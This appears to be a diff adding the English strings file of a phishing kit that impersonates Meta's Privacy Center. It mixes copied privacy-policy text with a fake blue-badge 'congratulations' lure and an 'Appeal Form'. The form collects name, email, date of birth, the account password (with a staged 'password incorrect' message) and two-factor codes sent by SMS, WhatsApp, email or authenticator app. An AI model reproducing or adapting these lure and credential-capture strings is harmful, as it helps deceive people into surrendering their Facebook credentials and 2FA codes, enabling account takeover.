@@ -1,0 +1,217 @@
+{
+  "app": {
+    "privacyCenter": {
+      "title": "Privacy Center",
+      "menuMobile": {
+        "open": "Open menu"
+      },
+      "actionButtons": {
+        "home": "Privacy Center Home Page",
+        "search": "Search",
+        "privacyPolicy": "Privacy Policy",
+        "otherRules": "Other rules and articles",
+        "settings": "Settings"
+      },
+      "privacyPolicyItems": {
+        "q1": "What is the Privacy Policy and what does it cover?",
+        "q2": "What information do we collect?",
+        "q3": "How do we use your information?",
+        "q4": "How do we share your information on Meta Products or with integrated partners?",
+        "q5": "How do we share information with third parties?",
+        "q6": "How is the cooperation between Meta Companies organized?",
+        "q7": "How can you manage or delete your information and exercise your rights?",
+        "q8": "How long do we keep your information?",
+        "q9": "How do we transmit information?",
+        "q10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+        "q11": "How will you know when the policy changes?",
+        "q12": "How to ask Meta questions?",
+        "q13": "Why and how we process your data"
+      },
+      "rulesItems": {
+        "cookiePolicy": "Cookie Policy",
+        "nonUsersInfo": "Information for those who do not use Meta Products",
+        "genAiInfo": "How Meta uses information for generative AI models",
+        "dataTransferFramework": "Data Transfer Framework Policy",
+        "otherTerms": "Other terms and conditions"
+      },
+      "settingsItems": {
+        "facebookSettings": "Facebook Settings",
+        "instagramSettings": "Instagram Settings"
+      },
+      "rightTop": {
+        "congrats": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+        "ticketId": "Your ticket id: {ticketId}"
+      },
+      "warnings": {
+        "w1": "The blue badge helps prevent identity impersonation, provides priority support via email and chat, and upgrades your profile with more professional features.",
+        "w2": "The blue badge verifies your authentic identity to reduce impersonation, provides priority support through email and chat, and unlocks advanced profile features.",
+        "w3": "With the blue badge, your identity is verified to prevent impersonation, you receive fast support via email/chat, and enjoy an upgraded profile experience with more features."
+      },
+      "cta": {
+        "requestReview": "Request Review"
+      },
+      "sections": {
+        "privacyCenter": "Privacy Center",
+        "moreDetailsAgreement": "For more details, see the User Agreement",
+        "additionalResources": "Additional resources"
+      },
+      "lists": {
+        "privacyCard1": {
+          "title": "What is the Privacy Policy and what does it say?",
+          "tag": "Privacy Policy"
+        },
+        "privacyCard2": {
+          "title": "How you can manage or delete your information",
+          "tag": "Privacy Policy"
+        },
+        "userAgreement": {
+          "metaAi": "Meta AI",
+          "tag": "User Agreement"
+        },
+        "resources": {
+          "r1": {
+            "title": "How Meta uses information for generative AI models",
+            "tag": "Privacy Center"
+          },
+          "r2": {
+            "title": "Cards with information about the operation of AI systems",
+            "tag": "Meta AI website"
+          },
+          "r3": {
+            "title": "Introduction to Generative AI",
+            "tag": "For teenagers"
+          }
+        }
+      },
+      "footer": {
+        "riskStatement": "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about",
+        "privacyPolicyLink": "Privacy Policy"
+      },
+      "alts": {
+        "loading": "Loading...",
+        "warningInstagramAccount": "warning instagram accont",
+        "iconWarning": "icon warning",
+        "metaAi": "Meta Ai"
+      },
+      "popup": {
+        "appealFormTitle": "Appeal Form",
+        "placeholders": {
+          "fullName": "Full name",
+          "email": "Email",
+          "businessEmail": "Email business",
+          "pageName": "Facebook page name",
+          "dobDay": "Day",
+          "dobMonth": "Month",
+          "dobYear": "Year",
+          "issue": "Describe your issue",
+          "code": "Enter code"
+        },
+        "helper": {
+          "responseTime": "Our response will be sent to you within 14 - 48 hours."
+        },
+        "toggle": {
+          "title": "On Facebook",
+          "desc": "We will send you a notification on Facebook."
+        },
+        "agree": {
+          "prefix": "I agree with",
+          "terms": "Terms of use"
+        },
+        "buttons": {
+          "send": "Send",
+          "continue": "Continue",
+          "tryOtherWay": "Try other way",
+          "returnToFacebook": "Return to Facebook"
+        },
+        "step2": {
+          "securityNote": "For security reasons enter your password to continue.",
+          "passwordIncorrect": "The password you've entered is incorrect.",
+          "password": "Enter password"
+        },
+        "step3": {
+          "userFallback": "User",
+          "facebookLabel": "Facebook",
+          "enterCode": "Enter code",
+          "tryAgainAfter": "Try again after {countdown} seconds"
+        },
+        "methodModal": {
+          "title": "Choose a way to confirm it’s you",
+          "desc": "These are your available confirmation methods."
+        },
+        "methods": {
+          "notification": {
+            "title": "Check your notifications on another device",
+            "desc": "We've sent a notification to your device. Check your Facebook notification on your device and approve access to continue."
+          },
+          "sms": {
+            "title": "Check your text messages",
+            "desc": "Enter the code we sent to {phone}."
+          },
+          "whatapp": {
+            "title": "Check your WhatsApp messages",
+            "desc": "Check your WhatsApp messages. Enter the code we sent to your WhatsApp account."
+          },
+          "email": {
+            "title": "Check your email",
+            "desc": "We sent a login code to {email}."
+          },
+          "recovery": {
+            "title": "Access your authentication app.",
+            "desc": "Enter the 6-digit verification code you received from your selected two-factor authentication app (such as Duo Mobile or Google Authenticator) for this account."
+          }
+        },
+        "step4": {
+          "title": "Request has been sent",
+          "desc": "Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal."
+        }
+      },
+      "menuPopup": {
+        "title": "Privacy Policy",
+        "subtitle": "What is the Privacy Policy and what does it cover?",
+        "mainThing": "The main thing in the section",
+        "intro1_beforeLink": "At Meta, we want you to understand what information we collect, how we use it, and with whom we share it. Therefore, we recommend that you read our Privacy Policy. This will help you use",
+        "intro1_linkMeta": "Meta",
+        "intro1_afterLink": "'s products the way you need.",
+        "intro2": "In the Privacy Policy, we explain how we collect, use, store information, and share it. We also tell you about your rights. Each section of the Policy contains useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you.",
+        "intro3_beforeLink": "It is important to us that you know how to manage your privacy, so we also show you where in the settings of the Meta Products you use you can manage your data. You can",
+        "intro3_linkUpdateSettings": "update these settings",
+        "intro3_afterLink": "to personalize your user experience.",
+        "fullTextNote": "The full text of the policy is provided below.",
+        "buttons": {
+          "productsCovered": "What products are covered by this policy?",
+          "learnMorePrivacyCenter": "Learn more about managing your privacy at Privacy Center"
+        },
+        "collect": {
+          "title": "What information do we collect?",
+          "desc_beforeProducts": "The information we collect and process about you depends on how you use our",
+          "link_products": "Products",
+          "desc_afterProducts": ". For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,",
+          "link_noAccount": "even if you do not have an account",
+          "desc_afterNoAccount": ".",
+          "typesIntro": "The following are the types of data we collect:",
+          "types": {
+            "actionsInfo": "Your actions and information you provide to us",
+            "friendsContacts": "Friends, subscribers and other contacts",
+            "appBrowserDevice": "Application, browser and device information",
+            "partnersThirdParties": "Information from Partners, suppliers and other third parties"
+          }
+        },
+        "notAllow": {
+          "title": "What happens if you do not allow us to collect certain types of information?",
+          "desc_beforeLink": "Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products.",
+          "link_moreDetails": "More details",
+          "desc_afterLink": "."
+        },
+        "deidentified": {
+          "title": "What if the information we collect does not personally identify individuals?",
+          "desc": "In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals."
+        },
+        "dataControl": {
+          "title": "Data control",
+          "cardTitle": "Manage the information we collect about you",
+          "cardTag": "Privacy Center"
+        }
+      }
+    }
+  }
+}
